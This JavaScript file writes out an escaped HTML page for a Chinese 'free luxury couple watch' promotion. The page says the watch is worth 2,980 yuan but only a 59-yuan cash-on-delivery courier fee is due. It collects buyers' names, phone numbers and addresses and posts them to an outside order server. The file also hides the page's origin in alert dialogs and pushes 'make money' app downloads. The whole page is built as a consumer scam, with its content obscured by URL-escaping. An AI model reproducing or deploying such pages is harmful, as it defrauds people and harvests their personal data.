var new_doc = document.open("text/html", "replace");
var txt = unescape("%3C%21DOCTYPE%20html%20PUBLIC%20%27-//W3C//DTD%20XHTML%201.0%20Transitional//EN%27%20%27http%3A//www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd%27%3E%0A%3Chtml%20lang%3D%27en%27%3E%0A%3Chead%3E%0A%20%20%20%20%3Cmeta%20charset%3D%27utf-8%27%20/%3E%0A%20%20%20%20%3Cmeta%20name%3D%27viewport%27%20content%3D%27width%3Ddevice-width%2C%20initial-scale%3D1.0%2C%20maximum-scale%3D1.0%2C%20minimum-scale%3D1.0%2C%20user-scalable%3Dno%2Cminimal-ui%27%3E%0A%20%20%20%20%3Cmeta%20content%3D%27telephone%3Dno%27%20name%3D%27format-detection%27%3E%0A%20%20%20%20%3Cmeta%20name%3D%27apple-mobile-web-app-capable%27%20content%3D%27yes%27%20/%3E%0A%20%20%20%20%3Cmeta%20name%3D%27apple-touch-fullscreen%27%20content%3D%27no%27%20/%3E%0A%20%20%20%20%3Clink%20href%3D%27https%3A//shiu00983.oss-cn-shanghai.aliyuncs.com/css/answer.css%27%20rel%3D%27stylesheet%27%20type%3D%27text/css%27%20/%3E%0A%20%20%20%20%3Clink%20href%3D%27https%3A//shiu00983.oss-cn-shanghai.aliyuncs.com/css/newmain.css%27%20rel%3D%27stylesheet%27%20type%3D%27text/css%27%20/%3E%0A%20%20%20%20%3Cscript%20src%3D%27https%3A//baohuaapp.oss-cn-hangzhou.aliyuncs.com/zcx/js/jquery-1.10.2.min.js%27%3E%3C/script%3E%0A%20%20%20%3Cscript%20src%3D%27https%3A//baohuaapp.oss-cn-hangzhou.aliyuncs.com/zcx/sb/js/cookies.js%27%20type%3D%27text/javascript%27%3E%3C/script%3E%0A%20%20%20%3Cscript%20src%3D%27https%3A//baohuaapp.oss-cn-hangzhou.aliyuncs.com/zcx/sb/js/jQueryRotate.2.1.js%27%20type%3D%27text/javascript%27%3E%3C/script%3E%0A%20%20%20%20%3Cstyle%3E%0A%09%20%20%20%20.top-ban%7B%20width%3A%20100%25%3Bmin-height%3A%208rem%3Bheight%3Aauto%3B%20background-color%3A%20white%3Boverflow%3A%20hidden%3B%7D%0A%09%20%20%20%20.swiper-container%20%7B%0A%09%20%20%20%20%20%20%20%20width%3A%20100%25%3B%0A%09%20%20%20%20%20%20%20%20height%3A%20100%25%3B%0A%09%20%20%20%20%20%20%20%20margin%3A0%20auto%3B%0A%09%20%20%20%20%7D%20%0A%09%20%20%20%20.swiper-pagination-bullet-active%7B%20background-color%3A%20%23ff8c25%7D%0A%20%20%20%20%3C/style%3E%0A%20%20%20%20%3Cstyle%3E%0A%20%20%20%20%09.top-ban%7B%20width%3A%20100%25%3Bmin-height%3A%208rem%3Bheight%3Aauto%3B%20background-color%3A%20white%3Boverflow%3A%20hidden%3B%7D%0A%20%20%20%20%20%20%20%20.new-color%7Bcolor%3A%20red%3Btext-shadow%3Awhite%201px%200%200%2Cwhite%200%201px%200%2Cwhite%200%20-1px%200%2Cwhite%20-1px%200%200%3B%7D%0A%20%20%20%20%20%20%20%20i%7Bfont-style%3A%20normal%3B%7D%0A%20%20%20%20%3C/style%3E%0A%3C/head%3E%0A%3Cbody%20class%3D%27detail-body%27%3E%0A%3Csection%20id%3D%27main-hide-box%27%3E%0A%20%20%20%20%3Ca%20href%3D%27ordersuccess%3A//%27%20style%3D%27display%3A%20none%3B%27%20id%3D%27ordersuccess%27%3E%3C/a%3E%0A%3Csection%20id%3D%27scrollbox%27%20style%3D%27overflow%3A%20hidden%3B%27%3E%0A%3Cdiv%20class%3D%27top-ban%27%3E%0A%20%20%20%20%3Cimg%20src%3D%27https%3A//baohuaapp.oss-cn-hangzhou.aliyuncs.com/itemImg/200_200/bhaitem84556b89837a4849ac87b2ea02187901.jpg%27%20alt%3D%27%27%3E%0A%3C/div%3E%20%20%0A%3Cdiv%20class%3D%27canshu-box%20tc%27%3E%0A%09%3Cdiv%20class%3D%27pro-title%20t-34%20c-p-name%27%3E%0A%20%20%20%20%u9AD8%u7AEF%u65F6%u5C1A%u60C5%u4FA3%u8155%u8868%0A%20%20%20%20%3Cp%20class%3D%27t-28%20c-p-fade%27%20style%3D%27width%3A80%25%3Bmargin%3A0%20auto%3B%27%3E%u745E%u58EB%u8FDB%u53E3%u673A%u82AF%u6280%u672F%u539F%u4EF72980.00%u5143%uFF0C%u65F6%u5C1A%u6F6E%u6D41%u60C5%u4FA3%u624B%u8868%uFF0C%u9650%u91CF%u514D%u8D39%u6D3E%u900110000%u5757%uFF01%u5148%u5230%u5148%u5F97%uFF01%3C/p%3E%0A%09%3C/div%3E%0A%09%3Cdiv%20class%3D%27pro-sth-canshu-box%27%3E%0A%09%09%3Cdiv%20class%3D%27pro-sth-canshu%20tc%27%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%3Cspan%20class%3D%27t-34%20p-r-1%27%3E%u73B0%u4EF7%uFF1A%3Cspan%20class%3D%27new-color%27%3E%200.00%0A%20%20%20%20%20%20%20%20%20%20%20%3C/span%3E%3C/span%3E%3Cspan%20class%3D%27t-26%20t-r%27%3E%u5E02%u573A%u4EF7%uFF1A0%3C/span%3E%3C/div%3E%0A%20%20%20%20%20%20%20%20%3Cul%3E%3Cdiv%20class%3D%27name%27%3E%3Cli%20class%3D%27current%27%20data-price%3D%272980.00%27%20data-sku%3D%27166463%27%3E%u7537%u6B3E%3C/li%3E%3Cli%20data-price%3D%272980.00%27%20data-sku%3D%27166464%27%3E%u5973%u6B3E%3C/li%3E%3C/div%3E%3C/ul%3E%0A%09%09%3C/div%3E%0A%09%3C/div%3E%0A%3C/div%3E%0A%3Cdiv%20class%3D%27detailbox%27%3E%0A%20%20%20%20%3Cdiv%20class%3D%27address-rule%20tc%20t-34%27%3E%u8BF7%u586B%u5199%u6536%u8D27%u5730%u5740%3Cspan%20class%3D%27c-p-fade%20t-22%27%3E%28%u6240%u6709%u4FE1%u606F%u5747%u4E3A%u5FC5%u586B%u9879%29%3C/span%3E%3C/div%3E%0A%20%20%20%20%3Cdiv%20id%3D%27dyname%27%20style%3D%27height%3A0%27%20%3E%3C/div%3E%0A%20%20%20%20%3Cul%20class%3D%27smbox%27%3E%0A%20%20%20%20%20%20%20%20%3Cli%3E%3Clabel%20for%3D%27name%27%3E%3Cspan%20class%3D%27c-p-money%27%3E*%3C/span%3E%u6536%u8D27%u4EBA%3C/label%3E%3Cinput%20type%3D%27text%27%20name%3D%27%27%20id%3D%27name%27%20%20placeholder%3D%27%u8BF7%u8F93%u5165%u6536%u8D27%u4EBA%27/%3E%3C/li%3E%0A%20%20%20%20%20%20%20%20%3Cli%3E%3Clabel%20for%3D%27phone%27%3E%3Cspan%20class%3D%27c-p-money%27%3E*%3C/span%3E%u8054%u7CFB%u7535%u8BDD%3C/label%3E%3Cinput%20type%3D%27text%27%20maxlength%3D%2711%27%20name%3D%27%27%20id%3D%27phone%27%20%20placeholder%3D%27%u8BF7%u8F93%u5165%u624B%u673A%u53F7%27/%3E%3C/li%3E%0A%20%20%20%20%20%20%20%20%3Cli%3E%3Clabel%3E%3Cspan%20class%3D%27c-p-money%27%3E*%3C/span%3E%u9009%u62E9%u5730%u533A%3C/label%3E%3Cform%20class%3D%27dzbox%27%3E%3Cselect%20class%3D%27select%27%20name%3D%27province%27%20id%3D%27s1%27%3E%3C/select%3E%3Cselect%20class%3D%27select%27%20name%3D%27city%27%20%0A%0Aid%3D%27s2%27%3E%3C/select%3E%3Cselect%20class%3D%27select%27%20name%3D%27town%27%20id%3D%27s3%27%3E%3C/select%3E%3C/form%3E%3C/li%3E%0A%20%20%20%20%20%20%20%20%3Cli%3E%3Clabel%20for%3D%27xxdz%27%3E%3Cspan%20class%3D%27c-p-money%27%3E*%3C/span%3E%u8BE6%u7EC6%u5730%u5740%3C/label%3E%3Cinput%20type%3D%27text%27%20name%3D%27%27%20id%3D%27xxdz%27%20%20placeholder%3D%27%u8BF7%u8F93%u5165%u8BE6%u7EC6%u5730%u5740%27/%3E%3C/li%3E%0A%0A%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%3C/ul%3E%0A%20%20%20%20%3Cdiv%20class%3D%27wuliu-box%27%3E%0A%20%20%20%20%09%3Cp%20class%3D%27title%20t-34%20c-p-name%27%3E%u7269%u6D41%u8D39%u7528%uFF1A%3Cspan%20class%3D%27c-p-money%27%3E%uFFE5%2059.00%3C/span%3E%3C/p%3E%0A%20%20%20%20%09%3Cp%20class%3D%27text%20t-28%27%3E%u8D27%u5230%u4ED8%u90AE%u4EF6%uFF0C%u4EA7%u54C1%u4EF7%u503C2980.00%u5143%uFF0C%u73B0%u5728%u514D%u8D39%u8D60%u9001%uFF0C%u53EA%u9700%u81EA%u62DF%u5FEB%u9012%u8D39%u7528%uFF0C%u5230%u4ED8%0A%2059.00%u5143%uFF0C%u7531%u5FEB%u9012%u516C%u53F8%u6536%u53D6%3C/p%3E%0A%20%20%20%20%3C/div%3E%0A%3C/div%3E%0A%3Cdiv%20class%3D%27xxsm%27%3E%0A%20%20%20%20%3Cp%20class%3D%27xxsm-title%20blue%27%3E%u6D3B%u52A8%u8BF4%u660E%3C/p%3E%0A%20%20%20%20%3Cp%3E%u56E0%u6D3B%u52A8%u53D1%u8D27%u91CF%u5DE8%u5927%uFF0C%u672C%u6D3B%u52A8%u53D1%u8D27%u73AF%u8282%u5DF2%u7EDF%u4E00%u5916%u5305%u7ED9%u5706%u901A%u5FEB%u9012%u516C%u53F8%u8D1F%u8D23%uFF08%u5305%u62EC%u4ED3%u50A8%uFF0C%u5305%u88C5%u76D2%uFF0C%u6253%u5305%uFF0C%u914D%u9001%u5FEB%u9012%uFF09%u672C%u6D3B%u52A8%u9700%u81EA%u884C%u5411%u5FEB%u9012%u516C%u53F8%u652F%u4ED8%u5230%u4ED8%u5FEB%u9012%u8D39%u53CA%u4EBA%u5DE5%u8D39%u5408%u8BA1%2059.00%u5143%uFF0C%u7531%u5FEB%u9012%u516C%u53F8%u6536%u53D6%uFF0C%u8D27%0A%0A%u5230%u540E%u5728%u4ED8%u6B3E%u7ED9%u5FEB%u9012%u5458%uFF01%3C/p%3E%0A%3C/div%3E%0A%3Cdiv%20class%3D%27agree%20tc%27%3E%0A%20%20%20%20%3Clabel%3E%3Cinput%20type%3D%27radio%27%20class%3D%27agbtn%27%20name%3D%27agbtn%27%20value%3D%27ok%27%20checked%3D%27checked%27%3E%u6211%u5DF2%u9605%u8BFB%u5E76%u540C%u610F%u4EE5%u4E0A%u6D3B%u52A8%u8BF4%u660E%3C/label%3E%0A%3C/div%3E%0A%3C/section%3E%0A%3Cdiv%20class%3D%27ready-buy-btn%27%3E%0A%20%20%20%20%3Ca%20style%3D%27background-color%3A%20none%3B%27%3E%3Cimg%20src%3D%27https%3A//baohuaapp.oss-cn-hangzhou.aliyuncs.com/zcx/sb/pcimg/font-bottom-btn20160623.png%27%20alt%3D%27%27%3E%3C/a%3E%0A%3C/div%3E%0A%3Cp%20style%3D%27color%3A%20%23f18c1f%3Bbackground-color%3A%20white%3Bline-height%3A%202rem%3Bpadding%3A1rem%3Bfont-size%3A1.2rem%3B%27%3E%u6CE8%uFF1A%u63D0%u4EA4%u8BA2%u5355%u540E%uFF0C%u5982%u9886%u53D6%u6210%u529F%uFF0C%u5C06%u4F1A%u4EE5%u77ED%u4FE1%u65B9%u5F0F%u53D1%u9001%u81F3%u60A8%u624B%u673A%uFF0C%u63D0%u793A%u9886%u53D6%u6210%u529F%uFF0C%u8BF7%u6CE8%u610F%u77ED%u4FE1%u56DE%u590D%uFF01%0A%3C/p%3E%0A%3Cimg%20src%3D%27https%3A//baohuaapp.oss-cn-hangzhou.aliyuncs.com/zcx/sb/pcimg/rule-bg20160623.png%27%20class%3D%27rule-bg%27%3E%0A%3Cimg%20src%3D%27https%3A//baohuaapp.oss-cn-hangzhou.aliyuncs.com/zcx/sb/pcimg/last-img20160623.jpg%27%20alt%3D%27%27%3E%0A%3C/section%3E%0A%0A%0A%20%20%20%20%3Cdiv%20class%3D%27show%27%20style%3D%27position%3Aabsolute%3Bdisplay%3Anone%27%3E%0A%20%20%20%20%20%20%3Ca%20target%3D%27_blank%27%20id%3D%27zcxdown%27%20style%3D%27display%3A%20block%27%20href%3D%27http%3A//a.app.qq.com/o/simple.jsp%3Fpkgname%3Dcom.cd_fortune.red%27%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cimg%20src%3D%27https%3A//baohuaapp.oss-cn-hangzhou.aliyuncs.com/RecImg/bhaimg8356da0bce054adb81473d20f61fcced.png%27%3E%3C/a%3E%0A%20%20%20%20%20%20%20%20%3Cimg%20src%3D%27https%3A//baohuaapp.oss-cn-hangzhou.aliyuncs.com/zcx/tg/imgs/xdok2.png%27%20alt%3D%27%27%3E%0A%20%20%20%20%20%20%20%20%3Ca%20target%3D%27_blank%27%20id%3D%27hbdown%27%20style%3D%27display%3A%20block%27%20href%3D%27http%3A//a.app.qq.com/o/simple.jsp%3Fpkgname%3Dcom.make.money%27%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cimg%20src%3D%27https%3A//baohuaapp.oss-cn-hangzhou.aliyuncs.com/RecImg/bhaimg8356da0bce054adb81473d20f61fcced.png%27%3E%3C/a%3E%0A%20%20%20%20%3C/div%3E%0A%20%20%20%20%3Cspan%20style%3D%27display%3A%20none%27%3E%0A%20%20%20%20%20%20%20%20%3Cscript%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20_hmt%20%3D%20_hmt%20%7C%7C%20%5B%5D%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%28function%20%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20hm%20%3D%20document.createElement%28%27script%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20hm.src%20%3D%20%27https%3A//hm.baidu.com/hm.js%3F939a35e2cad8dbce2b34fab2766a640b%27%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20s%20%3D%20document.getElementsByTagName%28%27script%27%29%5B0%5D%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20s.parentNode.insertBefore%28hm%2C%20s%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%28%29%3B%0A%20%20%20%20%20%20%20%20%3C/script%3E%0A%20%20%20%20%3C/span%3E%0A%3C/body%3E%0A%0A%3Cscript%20src%3D%27https%3A//baohuaapp.oss-cn-hangzhou.aliyuncs.com/zcx/sb/js/geo20160628.js%27%20type%3D%27text/javascript%27%3E%3C/script%3E%0A%0A%3Cscript%3E%0A%20window.alert%20%3D%20function%28name%29%7B%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20var%20iframe%20%3D%20document.createElement%28%22IFRAME%22%29%3B%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20iframe.style.display%3D%22none%22%3B%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20iframe.setAttribute%28%22src%22%2C%20%27data%3Atext/plain%2C%27%29%3B%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20document.documentElement.appendChild%28iframe%29%3B%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20window.frames%5B0%5D.window.alert%28name%29%3B%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20iframe.parentNode.removeChild%28iframe%29%3B%20%20%0A%7D%20%0Afunction%20detail%28%29%20%7B%0A%20%20%20%20var%20url%20%3D%20location.href%3B%0A%20%20%20%20if%20%28url.substring%28url.length%20-%201%29%20%3D%3D%20%27%23%27%29%20%7B%0A%20%20%20%20%20%20%20%20location.href%20%3D%20location.href%20+%20%27dyname%27%3B%0A%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20location.href%20%3D%20location.href%20+%20%27%23dyname%27%3B%0A%20%20%20%20%7D%0A%0A%7D%0Afunction%20promptinfo%28%29%20%7B%0A%20%20%20%20var%20s1%20%3D%20document.getElementById%28%27s1%27%29%3B%0A%20%20%20%20var%20s2%20%3D%20document.getElementById%28%27s2%27%29%3B%0A%20%20%20%20var%20s3%20%3D%20document.getElementById%28%27s3%27%29%3B%0A%7D%0A%24%28function%20%28%29%20%7B%0A%20%20%20%20var%20isbuy%20%3D%20%24.getCookie%28%27isbuy%27%29%3B%0A%20%20%20%20if%20%28isbuy%20%3D%3D%20%27yes%27%29%20%7B%0A%20%20%20%20%20%20%20%20%24%28%27%23main-hide-box%27%29.attr%28%27style%27%2C%20%27display%3Anone%27%29%3B%0A%20%20%20%20%20%20%20%20alert%28%27%u60A8%u4ECA%u5929%u5DF2%u7ECF%u62BD%u8FC7%u4E86%27%29%3B%0A%20%20%20%20%7D%0A%20%20%20%20setTimeout%28function%20%28%29%20%7B%0A%20%20%20%20%20%20%20%20setup%28%29%3B%20promptinfo%28%29%3B%0A%20%20%20%20%7D%2C%201000%29%0A%7D%29%3B%0A%3C/script%3E%0A%3Cscript%20type%3D%22text/javascript%22%20src%3D%22https%3A//baohuaapp.oss-cn-hangzhou.aliyuncs.com/zcx/sb/js/geo20160628.js%22%3E%3C/script%3E%0A%3Cscript%3E%0A%20%20%20%20function%20dzcleck%28%29%20%7B%0A%20%20%20%20%20%20%20%20var%20cpsth%20%3D%20%24%28%22.pro-sth-canshu%20ul%20li.current%22%29.text%28%29%3B%0A%20%20%20%20%20%20%20%20var%20name%20%3D%20%24%28%22%23name%22%29.val%28%29%3B%0A%20%20%20%20%20%20%20%20var%20tel%20%3D%20%24%28%22%23phone%22%29.val%28%29%3B%20//%u83B7%u53D6%u624B%u673A%u53F7%0A%20%20%20%20%20%20%20%20var%20telReg%20%3D%20%21%21tel.match%28/%5E%5B1-9%5D%5B0-9%5D%7B10%7D%24/%29%3B%0A%20%20%20%20%20%20%20%20//%u5982%u679C%u624B%u673A%u53F7%u7801%u4E0D%u80FD%u901A%u8FC7%u9A8C%u8BC1%0A%20%20%20%20%20%20%20%20var%20address%20%3D%20%24%28%22%23s3%22%29.val%28%29%3B%0A%20%20%20%20%20%20%20%20var%20xxdz%20%3D%20%24%28%22%23xxdz%22%29.val%28%29%3B%0A%20%20%20%20%20%20%20%20if%20%28cpsth%20%3D%3D%20%22%22%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20alert%28%22%u8BF7%u9009%u62E9%u5546%u54C1%u7C7B%u578B%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20if%20%28name%20%3D%3D%20%22%22%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20alert%28%22%u8BF7%u6B63%u786E%u7684%u586B%u5199%u59D3%u540D%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20if%20%28telReg%20%3D%3D%20false%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20alert%28%22%u8BF7%u6B63%u786E%u7684%u586B%u5199%u624B%u673A%u53F7%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20if%20%28address%20%3D%3D%20%22%u9009%u62E9%u533A%u53BF%22%20%7C%7C%20address%20%3D%3D%20%22%22%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20alert%28%22%u8BF7%u6B63%u786E%u7684%u586B%u5199%u5730%u5740%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20if%20%28xxdz%20%3D%3D%20%22%22%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20alert%28%22%u8BF7%u60A8%u586B%u5199%u8BE6%u7EC6%u5730%u5740%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20var%20address%20%3D%20%24%28%22%23s1%22%29.val%28%29%20+%20%24%28%22%23s2%22%29.val%28%29%20+%20%24%28%22%23s3%22%29.val%28%29%3B%0A%20%20%20%20%20%20%20%20return%20cpsth%20+%20%22%7C%22%20+%20name%20+%20%22%7C%22%20+%20tel%20+%20%22%7C%22%20+%20address%20+%20%22%7C%22%20+%20xxdz%3B%0A%20%20%20%20%7D%0A%20%20%20%20%24%28function%20%28%29%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22.pro-sth-canshu%20ul%20li%22%29.on%28%22click%22%2C%20function%20%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24%28this%29.siblings%28%29.removeClass%28%22current%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24%28this%29.addClass%28%22current%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20//%20var%20watchXH%3D%24%28%22.pro-sth-canshu%20ul%20li.current%22%29.text%28%29%3B%0A%20%20%20%20%20%20%20%20%7D%29%3B%0A%0A%20%20%20%20%20%20%20%20%24%28%22.ready-buy-btn%20a%22%29.on%28%22click%22%2C%20function%20%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20x%20%3D%20%24%28%27input%3Aradio%5Bname%3D%22agbtn%22%5D%3Achecked%27%29.val%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20%28x%20%21%3D%20undefined%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20sth%20%3D%20dzcleck%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28sth%20%3D%3D%20false%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20//%20%E8%AF%B7%E6%B1%u201A%E5%8F%u2018%E9%u20AC%81%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20itemid%20%3D%205648%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20skuid%20%3D%20%24%28%27.current%27%29.attr%28%27data-sku%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20name%20%3D%20%24%28%22%23name%22%29.val%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20phone%20%3D%20%24%28%22%23phone%22%29.val%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20province%20%3D%20%24%28%22%23s1%22%29.val%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20city%20%3D%20%24%28%22%23s2%22%29.val%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20area%20%3D%20%24%28%22%23s3%22%29.val%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20desc%20%3D%20%24%28%22%23xxdz%22%29.val%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20yzm%20%3D%20%24%28%22%23yzm%22%29.val%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20channel%20%3D%20%27zcx_wxdy001_android%27%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20userid%20%3D%200%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24.post%28%27https%3A//ssl.xzhizhu.com/Weixin20160530/Order.aspx%27%2C%20%7B%20itemid%3A%20itemid%2C%20skuid%3A%20skuid%2C%20name%3A%20name%2C%20phone%3A%20phone%2C%20province%3A%20province%2C%20city%3A%20city%2C%20area%3A%20area%2C%20desc%3A%20desc%2C%20yzm%3A%20yzm%2C%20channel%3A%20channel%2C%20userid%3A%20userid%20%7D%2C%20function%20%28data%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28data.indexOf%28%22%u63D0%u4EA4%u6210%u529F%22%29%20%3E%20-1%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20//%24%28%27.detail-removebox%27%29.remove%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%27%23main-hide-box%27%29.remove%28%29%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22body%22%29.height%28%24%28%22.show%22%29.height%28%29%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20window.scrollTo%280%2C%200%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%27.show%27%29.show%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24.setCookie%28%22isbuy%22%2C%20%27yes%27%2C%20360%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20strs%20%3D%20data.split%28%27%7C%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28strs.length%20%3D%3D%204%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20location.href%20%3D%20%24%28%27%23indexurl%27%29.val%28%29%20+%20%22/html/gopay.htm%3Furl%3D%22%20+%20strs%5B3%5D%20+%20%22%26orderno%3D%22%20+%20strs%5B1%5D%20+%20%22%26money%3D%22%20+%20strs%5B2%5D%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20a%20%3D%20document.getElementById%28%22ordersuccess%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20a.click%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20alert%28data%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20mydate%20%3D%20new%20Date%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%27%23yzmimg%27%29.attr%28%22src%22%2C%20%24%28%27%23yzmimg%27%29.attr%28%22src%22%29%20+%20%22%3Ft%3D%22%20+%20mydate.getDate%28%29%29%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20alert%28%22%u8BF7%u52FE%u9009%u540C%u610F%u6D3B%u52A8%u8BF4%u660E%22%29%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%20%20%20%20function%20promptinfo%28%29%0A%20%20%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20s1%20%3D%20document.getElementById%28%27s1%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20s2%20%3D%20document.getElementById%28%27s2%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20s3%20%3D%20document.getElementById%28%27s3%27%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20setTimeout%28function%28%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20setup%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20promptinfo%28%29%3B%0A%20%20%20%20%20%20%20%20%7D%2C2000%29%0A%20%20%20%20%7D%29%3B%0A%3C/script%3E%0A%3C/html%3E");
new_doc.write(txt);
new_doc.close();